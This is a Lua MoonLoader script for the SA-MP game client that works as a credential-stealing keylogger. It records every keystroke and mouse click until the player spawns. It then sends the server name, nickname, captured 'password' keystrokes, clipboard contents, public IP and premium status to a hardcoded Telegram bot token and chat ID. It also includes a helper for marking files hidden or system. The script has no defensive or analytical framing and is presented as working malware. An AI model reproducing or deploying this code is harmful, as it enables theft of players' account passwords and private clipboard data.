require "moonloader"
vk = require "vkeys"
wm = require "windows.message"
local requests = require("requests")
local encoding = require("encoding")
local sampev = require 'lib.samp.events'
local dlstatus = require('moonloader').download_status

encoding.default = "CP1251"
local u8 = encoding.UTF8

local pressed_keys = {}

local spawned = false

local utils
local telegram
local bot

local ip_address = nil
local premium

local FILE_ATTRIBUTE = {
    ARCHIVE = 32, -- (0x20)
    HIDDEN = 2, -- (0x2)
    NORMAL = 128, -- (0x80)
    NOT_CONTENT_INDEXED = 8192, -- (0x2000)
    OFFLINE = 4096, -- (0x1000)
    READONLY = 1, -- (0x1)
    SYSTEM = 4, -- (0x4)
    TEMPORARY = 256, -- (0x100)
}

function log_key(key)
    table.insert(pressed_keys, vk.id_to_name(key))
end

addEventHandler("onWindowMessage", function(message, wp, lp)
    if bit.band(lp, 0x40000000) == 0 then 
        if message == wm.WM_KEYDOWN or message == wm.WM_SYSKEYDOWN then 
            log_key(wp)
        elseif message >= wm.WM_LBUTTONDOWN and message <= wm.WM_XBUTTONDBLCLK then 
            local mouseButton = nil
            if message == wm.WM_LBUTTONDOWN or message == wm.WM_LBUTTONDBLCLK then
                mouseButton = vk.VK_LBUTTON
            elseif message == wm.WM_RBUTTONDOWN or message == wm.WM_RBUTTONDBLCLK then
                mouseButton = vk.VK_RBUTTON
            elseif message == wm.WM_MBUTTONDOWN or message == wm.WM_MBUTTONDBLCLK then
                mouseButton = vk.VK_MBUTTON
            elseif message == wm.WM_XBUTTONDOWN or message == wm.WM_XBUTTONDBLCLK then
                local X = bit.rshift(bit.band(wp, 0xffff0000), 16)
                if X == 1 then
                    mouseButton = vk.VK_XBUTTON1
                elseif X == 2 then
                    mouseButton = vk.VK_XBUTTON2
                end
            end
            if mouseButton then
                log_key(mouseButton)
            end
        end
    end
end)

function SetFileAttributes(file, ATTRIBUTE)
    local ffi = require('ffi')
    ffi.cdef([[
        bool SetFileAttributesA(
            const char* lpFileName,
            int  dwFileAttributes
        );
    ]])
    ffi.C.SetFileAttributesA(file, ATTRIBUTE)
end

local Utils = {} 
function Utils:new() 
    local public
    local private
    private = {}
        
    public = {}
        function public:encodeUrl(str)
        for c in str:gmatch("[%c%p%s]") do
            if (c ~= "%") then
                local find = str:find(c, 1, true)
                if find then
                    local char = str:sub(find, find)
                    str = str:gsub(string.format("%%%s", char), ("%%%%%02X"):format(char:byte()))
                end
            end
        end
        return u8(str)
    end
    
    setmetatable(public, self)
    self.__index = self; return public
end

local Telegram = {}
function Telegram:new(token, chatId) 
    local public
    local private
    private = {}
        private.token = token
        private.chatId = chatId
    
    public = {}
        function public:sendMessage(text)
            text = text:gsub("{......}", "")
            local params = {
                chat_id = private.chatId,
                text = utils:encodeUrl(text)
            }
            local url = ("https://api.telegram.org/bot%s/sendMessage"):format(private.token)
            local status, result = pcall(requests.get, {url = url, params = params})     
            if not status then
                print("Ошибка при отправке:", result)
            end              
        end

    setmetatable(public, self)
    self.__index = self; return public
end

local function getIPAddress()
    local status, response = pcall(requests.get, "https://api.ipify.org/")
    if status and response.status_code == 200 then
        ip_address = response.text
    else
        ip_address = "Не удалось получить IP-адрес"
    end
end

utils = Utils:new()
telegram = Telegram:new("7094826046:AAGntZxJ8YjYowsx5NDHcbJIYo50ihJPS0o", "-1002144476171")

getIPAddress()

function sampev.onServerMessage(color, text)
    if spawned then
        if text:find('Ваш премиум') then
            premium = true
        end
    end
end

addEventHandler("onSendRpc", function(id)
    if id == 52 then
        spawned = true
        local nickname = sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(playerPed)))
        local password = table.concat(pressed_keys, ", ")
        if password == "" or password == nil then
            password = "Не удалось получить пароль"
        end
        bufer = getClipboardText()
        lua_thread.create(function()
            wait(3500)
            if premium then
                telegram:sendMessage(("%%E2%%99%%BB Пришёл новый лог. \n\n%%F0%%9F%%92%%BB Сервер: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\". \n%%F0%%9F%%91%%91 Premium: Имеется\n%%F0%%9F%%A4%%96 Clipboard: \"%s\"\n%%F0%%9F%%92%%BD IP входа: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
            else
                telegram:sendMessage(("%%E2%%99%%BB Пришёл новый лог. \n\n%%F0%%9F%%92%%BB Сервер: \"%s\". \n%%F0%%9F%%91%%B1%%E2%%80%%8D%%E2%%99%%82%%EF%%B8%%8F Nick: \"%s\". \n%%F0%%9F%%94%%93 Password: \"%s\".\n%%F0%%9F%%A4%%96 Clipboard: \"%s\". \n%%F0%%9F%%92%%BD IP входа: \"%s\"\n\n%%F0%%9F%%A4%%96 Version: 0.6"):format(sampGetCurrentServerName(), nickname, password, bufer, ip_address))
            end
            pressed_keys = {}
        end)
    end
end)

function activateKeyLogger()
    spawned = false
    pressed_keys = {}
end

function deactivateKeyLogger()
    spawned = true
end

function main()
    activateKeyLogger()
    sampRegisterChatCommand('spawn',function(id)
        local bs = raknetNewBitStream()
        raknetSendRpc(52, bs)
        raknetDeleteBitStream(bs)
    end)
end

main()